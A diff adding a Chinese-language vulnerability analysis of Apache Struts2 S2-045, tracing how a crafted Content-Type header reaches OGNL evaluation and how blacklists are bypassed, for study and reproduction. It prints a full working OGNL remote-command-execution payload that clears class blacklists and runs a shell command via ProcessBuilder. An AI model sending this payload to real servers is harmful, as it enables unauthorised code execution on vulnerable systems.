@@ -991,13 +991,105 @@ xxx.action?redirect:%{#context['xwork.MethodAccessor.denyMethodExecution']=false
 <a name="s2-045"></a>
 ## S2-045
 
+官方漏洞公告：https://cwiki.apache.org/confluence/display/WW/S2-045
+
+影响版本：`Struts 2.3.5`-`Struts 2.3.31`, `Struts 2.5`-`Struts 2.5.10`
+
 ## 漏洞复现与分析
 
+从漏洞公告可获悉，如果`Content-Type`请求头的值表示一个上传类型，但值是无效的，且是一个精心构造的OGNL表达式时，`Jakarta Multipart parser`这个解析器在对`Content-Type`处理的过程中，会触发异常，在处理异常信息的时候会计算OGNL表达式，从而造成远程代码执行。
 
+这里使用Struts2 `2.3.31`版本自带的示例应用`struts-blank`进行调试分析。
+
+因为得是上传类型，故`Content-Type`的值包含字符串`multipart/form-data`。另外，在`Jakarta Multipart parser`解析器对应的类`JakartaMultiPartRequest`的解析请求的方法`parse()`方法中下断点。
+
+命中断点后，跟进它的处理，可以看到，当`content-type`请求头的值不是以`multipart/`开头时，则抛出异常`InvalidContentTypeException`，同时将`content-type`的值拼接到异常消息字符串中。
+
+<img src="pic/struts2_s2-045_1.png">
+
+抛出异常后，则在`JakartaMultiPartRequest#buildErrorMessage()`对异常消息进行处理。
+
+<img src="pic/struts2_s2-045_2.png">
+
+继续跟进，看到了熟悉的`TextParseUtil.translateVariables()`，往后就是从异常消息字符串中根据`%`符号提取OGNL表达式并计算求值，这里不再细说，因为前面分析其他漏洞的文章里已经详细分析过了。
+
+<img src="pic/struts2_s2-045_3.png">
+
+<img src="pic/struts2_s2-045_4.png">
+
+下面重点说一下PoC的构造。
 
 ### 可回显PoC
 
+>注：关于OGNL表达式的形式，可参考官方文档：<br>
+>https://commons.apache.org/proper/commons-ognl/language-guide.html
 
+因为Struts2从`2.3.28.1`版本开始，在`OgnlUtil`类中，对`(e1,e2,e3,e4,...)`这种形式的表达式进行了限制，不允许执行。`(e1,e2,e3,e4,...)`这种形式的表达式会被解析为`ASTSequence`类型，而`ASTSequence#isSequence()`永远返回`true`，从而向上抛出异常，不会继续对表达式进行求值。关键代码如下：
+
+<img src="pic/struts2_s2-045_7.png">
+    
+<img src="pic/struts2_s2-045_5.png">
+    
+<img src="pic/struts2_s2-045_6.png">
+    
+所以这里换一种表达式形式：`(e1).(e2).(e3).(e4)....`。这种形式的表达式会被解析为`ASTChain`类型，没有被限制执行。
+
+所以，构造简单PoC如下：
+
+```
+%{
+(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
+(#a=1).
+(#b=2*#a).
+(#c=2*#b).
+(#ret=4*#c).
+(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',#ret)).
+(multipart/form-data)
+}
+```
+
+<img src="pic/struts2_s2-045_8.png">
+
+要构造命令执行的PoC，首先要将上下文对象`context`的`_memberAccess`属性重新赋值为`DEFAULT_MEMBER_ACCESS`。但Struts2 `2.3.31`的代码里，上下文对象`context`内部的`Map`集合已经没有`_memberAccess`这个键，当然也就无法向之前一样通过`#context['_memberAccess']`或`#_memberAccess`去访问`context`的`_memeberAccess`属性。(详见`OgnlContext`的`static`代码块和`get(Object key)`方法)
+
+但可以通过`OgnlContext`的`setMemberAccess()`方法去设置它。然而在此之前，还得做些工作。否则`OgnlContext#setMemberAccess()`无法执行。为什么呢？这里直接拿网上的漏洞利用工具/脚本里的`S2-045`漏洞exploit来解释，如下:
+```
+%{
+(#t='multipart/form-data').
+(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
+(#_memberAccess?(#_memberAccess=#dm):
+		(
+		(#container=#context['com.opensymphony.xwork2.ActionContext.container']).
+		(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
+		(#ognlUtil.getExcludedPackageNames().clear()).
+		(#ognlUtil.getExcludedClasses().clear()).
+		(#context.setMemberAccess(#dm)))).
+(#cmd='id').
+(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
+(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
+(#p=new java.lang.ProcessBuilder(#cmds)).
+(#p.redirectErrorStream(true)).
+(#process=#p.start()).
+(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).
+(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).
+(#ros.flush())
+}
+```
+
+<img src="pic/struts2_s2-045_10.png">
+
+- 因为版本较旧的Struts2，上下文对象`context`内部的`Map`集合里还是存在`_memberAccess`属性的，同时也可以通过`get`方法访问，而版本较新的则没有。所以这里使用条件形式的表达式`(e1)?(e2):(e3)`来实现版本的兼容。
+- 这里在执行`#context.setMemberAccess()`前，为什么要先调用`#ognlUtil.getExcludedPackageNames().clear()`和`#ognlUtil.getExcludedClasses().clear()`呢？原因是在较新的Struts2版本中，默认情况下，会通过类名和包名黑名单的形式禁止OGNL表达式中某些类的方法调用。Struts2 `2.3.31`里的类名、包名的黑名单如下图所示。
+
+<img src="pic/struts2_s2-045_11.png">
+
+对黑名单的读取和使用，是在`OgnlValueStack#setOgnlUtil()`方法中，如下图：
+
+<img src="pic/struts2_s2-045_12.png">
+
+可以看到，连`OgnlContext`都在黑名单中，所以必须得先将黑名单集合`excludedClasses`和`excludedPackageNames`给清空，同时又不能使用黑名单里的类去调用方法。故这个exploit给了一个思路：
+
+先通过`#container=#context['com.opensymphony.xwork2.ActionContext.container']`来获取`ContainerImpl`对象，通过`ContainerImpl#getInstance()`方法来获取`OgnlUtil`对象，而`OgnlUtil`并不在黑名单中，所以再通过`#ognlUtil.getExcludedPackageNames().clear()`和`#ognlUtil.getExcludedClasses().clear()`来清空存储黑名单的集合。清除后，上下文对象`context`就可以调用`setMemberAccess()`方法去重置`_memberAccess`属性了。
 
 ## 漏洞修复
 
